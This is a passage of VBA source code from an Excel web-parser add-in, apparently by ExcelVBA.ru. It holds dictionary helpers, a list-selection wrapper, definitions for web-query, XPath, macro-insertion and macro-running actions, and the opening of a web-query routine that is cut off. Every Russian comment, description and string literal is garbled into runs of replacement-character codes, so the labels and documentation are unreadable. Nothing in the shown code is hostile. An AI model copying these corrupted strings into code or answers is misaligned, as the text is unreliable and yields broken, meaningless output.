        .AddParameter "DicName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
End Sub

Function Dictionary_FindKey(ByVal key$, ByRef ReturnValue$, ByVal ActionIfFound$, ByVal ActionIfAbsent$, Optional ByVal DicName$) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:
    '    -1 |fffd||fffd||fffd| -2 (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    '    0 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
    '    1 (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| ReturnValue$)
    On Error Resume Next
    With GetDictionaryByName(DicName$)
        If .Exists(key$) Then
            Select Case ActionIfFound$
                Case "": Dictionary_FindKey = 0
                Case "return 1": Dictionary_FindKey = 1: ReturnValue$ = "1"
                Case "return key": Dictionary_FindKey = 1: ReturnValue$ = key$
                Case "return value": Dictionary_FindKey = 1: ReturnValue$ = .item(key$)
                Case "return empty": Dictionary_FindKey = 1: ReturnValue$ = ""
                Case "remove key": Dictionary_FindKey = 0: .Remove key$
                Case "stop -1": Dictionary_FindKey = -1
                Case "stop -2": Dictionary_FindKey = -2
            End Select
        Else
            Select Case ActionIfAbsent$
                Case "": Dictionary_FindKey = 0
                Case "return 0": Dictionary_FindKey = 1: ReturnValue$ = "0"
                Case "add key": .Add key$, ""
                Case "stop -1": Dictionary_FindKey = -1
                Case "stop -2": Dictionary_FindKey = -2
            End Select
        End If
    End With
End Function

Function Dictionary_GetContent(ByVal ResultType$, Optional ByVal DicName$) As String
    On Error Resume Next: Dim i&, arr
    With GetDictionaryByName(DicName$)
        Select Case ResultType$
            Case "keys"
                Dictionary_GetContent = Join(.Keys, ARSEP)
            Case "values"
                Dictionary_GetContent = Join(.Items, ARSEP)
            Case "key|value"
                arr = .Keys
                For i = LBound(arr) To UBound(arr)
                    arr(i) = arr(i) & "|" & .item(CStr(arr(i)))
                Next i
                Dictionary_GetContent = Join(arr, ARSEP)
                Erase arr
            Case "Count"
                Dictionary_GetContent = .Count
            Case "RemoveAll"
                Dictionary_GetContent = ""
                .RemoveAll
        End Select
    End With
End Function

Function Dictionary_AddItem(ByVal key$, Optional ByVal value$, Optional ByVal DicName$)
    On Error Resume Next
    GetDictionaryByName(DicName$).item(key$) = value$
End Function

Function GetDictionaryByName(ByVal DicName$) As Dictionary
    On Error Resume Next
    If Dictionaries Is Nothing Then Set Dictionaries = New Dictionary: Dictionaries.CompareMode = TextCompare
    
    Dim dic As Dictionary
    If Dictionaries.Exists(DicName$) Then
        Set dic = Dictionaries.item(DicName$)
    Else
        Set dic = New Dictionary: dic.CompareMode = TextCompare
        Dictionaries.Add DicName$, dic
    End If
    Set GetDictionaryByName = dic
End Function

Function DictionaryExists(ByVal DicName$) As Boolean
    On Error Resume Next
    If Dictionaries Is Nothing Then Exit Function
    DictionaryExists = Dictionaries.Exists(DicName$)
End Function

Sub ClearDictionaries()
    On Error Resume Next
    Dim key, dic As Dictionary
    If Dictionaries Is Nothing Then Exit Sub
    With Dictionaries
        For Each key In .Keys    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            .item(CStr(key)).RemoveAll
        Next
    End With
    Set Dictionaries = Nothing
End Sub

Private Sub test_dic()
    Dictionary_AddItem "123", "test1"
    Dictionary_AddItem "456", "test2"
    'GetDictionaryByName("").RemoveAll
    
    Debug.Print Dictionary_GetContent("keys")
    Debug.Print Dictionary_GetContent("values")
    Debug.Print Dictionary_GetContent("key|value")
End Sub

Sub test_UserChoiseFromArray()
    On Error Resume Next
    Dim arr, res
    arr = Array("URL1|value1", "URL2|value2", "URL3|value3", "URL4|value4")
    res = UserChoiseFromArray(arr, , , "1")
    
    If IsArray(res) Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & UBound(res)
    Else
        'MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub


Function UserChoiseFromArray(ByVal arr, Optional DefaultMode As SELECT_OPTIONS = so_MultiSelect, Optional ModeAvailable As SELECT_OPTIONS = so_All, _
        Optional ColumnToShow$ = "", Optional DefaultSelection$ = "1", Optional ByVal FormCaption$) As Variant
    On Error Resume Next
    Dim i&, col&, cnt&, ind&
    col& = Val(ColumnToShow$)
    
    ReDim arr2(LBound(arr) To UBound(arr), 0 To 1)
    
    For i = LBound(arr) To UBound(arr)
        arr2(i, 0) = i
        If col& > 0 Then
            arr2(i, 1) = Split(arr(i), "|")(col& - 1)
        Else
            arr2(i, 1) = arr(i)
        End If
    Next i
    
    SelectFromArrayResult = ""
    
    With F_SelectFromList
        .ListBox_Items.list = arr2
        .SetMode DefaultMode
        .SetAvailableModes ModeAvailable
        If Len(Trim(FormCaption$)) Then .Caption = FormCaption$
        .SelectOnStart DefaultSelection$
        .Show
    End With
    
    If Not IsArray(SelectFromArrayResult) Then Exit Function
    For i = LBound(SelectFromArrayResult) To UBound(SelectFromArrayResult)
        cnt& = cnt& - CBool(SelectFromArrayResult(i))
    Next i
    
    ReDim res(1 To cnt&)
    For i = LBound(SelectFromArrayResult) To UBound(SelectFromArrayResult)
        If CBool(SelectFromArrayResult(i)) Then ind& = ind& + 1: res(ind&) = arr(i)
    Next i
    UserChoiseFromArray = res
    
End Function

Attribute VB_Name = "mod_AAs_WebQuery_XML_Macros"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_WebQuery_XML_Macros                    Version:
' Author        : Igor Vakhnenko                   Date: 06.05.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_WebQuery(ByRef AAs As ArrayActions)
    On Error Resume Next
    With AAs.AddAction(fc_WebQuery_XML_Macro, "WebQuery", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "URL", aps_Text, "URL (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "WebTables", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10"), "1"
        .AddParameter "Format", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_WebQuery_XML_Macro, "TableToSheet", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)."
        .AddParameter "Filters", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "ColumnsOrder", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "1-7"
    End With

    With AAs.AddAction(fc_WebQuery_XML_Macro, "XML_Query", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| XPath, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| XML |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| XML, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| XML." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|text|fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {name}={@id}={brand}, " & _
                       "|fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| XML (name, brand) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (id)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| XML |fffd||fffd||fffd||fffd| <collection id='1234'><name>MyName</name><brand>MyBrand</brand></collection>" & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| {name}|{@id}|{brand} |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MyName|1234|MyBrand"
        .AddParameter "XPath", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| XPath"
        .AddParameter "Output", aps_List, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)", Array("text", "xml", "attribute"), "text"
        .AddParameter "Attribute", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Default", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_WebQuery_XML_Macro, "AddMacroToWorkbook", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| VBA |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| VBA |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| testmacro {ParserName}, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| testmacro |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!"
        .AddParameter "MacroName", aps_RuntimeList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "Macro"
        .AddParameter "RunMacro", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "DeleteMacroWhenDone", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With

    With AAs.AddAction(fc_WebQuery_XML_Macro, "DeleteMacroModules", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| VBA")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| pm_*, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!"
        .AddParameter "ModuleNameMask", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| VBA", , "pm_*"
    End With

    With AAs.AddAction(fc_WebQuery_XML_Macro, "RunMacro", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|:" & vbNewLine & _
                       "Function MacroName(ByRef txt$, ByRef Destination As Range, ParamArray args()) As Long" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: http://excelvba.ru/programmes/Parser/manuals/macro"

        .AddParameter "MacroName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Parameter1", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1"
        .AddParameter "Parameter2", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2"
        .AddParameter "Parameter3", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3"
    End With

End Sub

Function Execute_XML_Query(ByRef txt$, ByVal xpath$, Optional ByVal output$ = "text", _
                           Optional ByVal attr_name$ = "", Optional ByVal default_value$ = "") As String
    On Error Resume Next
    Dim XML As New DOMDocument, NList As IXMLDOMNodeList, node As IXMLDOMNode, v$, nodename$, match, LoadOK As Boolean, ind&
    XML.setProperty "SelectionLanguage", "XPath"
    XML.validateOnParse = False
    XML.async = True

    If Len(txt) < 250 And ((txt$ Like "[A-Za-z]:\?*") Or (txt$ Like "\\?*")) Then
        LoadOK = XML.Load(txt$)    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
    Else
        LoadOK = XML.LoadXML(txt$)
    End If

    If LoadOK Then
        Set NList = XML.DocumentElement.SelectNodes(xpath$)
        If NList.Length Then
            ReDim res(1 To NList.Length) As String

            For Each node In NList
                v$ = "": ind& = ind& + 1

                Select Case LCase(output$)
                    Case "text", "|fffd||fffd||fffd||fffd||fffd|", ""
                        If attr_name$ Like "*{*}*" Then
                            v$ = attr_name$
                            With REGEXP
                                .Pattern = "{([^{}@]+)}"
                                If .test(attr_name$) Then
                                    For Each match In .Execute(attr_name$)
                                        nodename$ = match.submatches.item(0)
                                        v$ = Replace(v$, match.value, node.SelectSingleNode(nodename$).text)
                                    Next
                                End If
                                .Pattern = "{@([^{}]+)}"
                                If .test(attr_name$) Then
                                    For Each match In .Execute(attr_name$)
                                        nodename$ = match.submatches.item(0)
                                        v$ = Replace(v$, match.value, node.Attributes.getNamedItem(nodename$).text)
                                    Next
                                End If
                            End With
                        Else
                            v$ = node.text
                        End If
                    Case "xml"
                        v$ = node.XML
                    Case "attribute"
                        If Len(attr_name$) Then v$ = node.Attributes.getNamedItem(attr_name$).text
                End Select

                If v$ = "" Then res(ind&) = default_value$ Else res(ind&) = v$
            Next

            Execute_XML_Query = Join(res, ARSEP)
            Erase res
        End If
        If Execute_XML_Query = "" Then Execute_XML_Query = default_value$
    Else
        If TEST_ACTIONS_MODE Then AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML|fffd|</b>" & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| XML", bt_Warning
    End If

    Set XML = Nothing: Err.Clear
End Function


Sub Action_WebQuery(ByVal PageText$, ByVal WebTables$, ByVal WebFormatting$)
    On Error Resume Next: Err.Clear
    Dim FileName$, FSO As Object, ts As Object, sh As Worksheet, ConnectionString$
    FileName$ = FWF.temp_filename & "_WebQuery.html"
    Set FSO = CreateObject("scripting.filesystemobject")
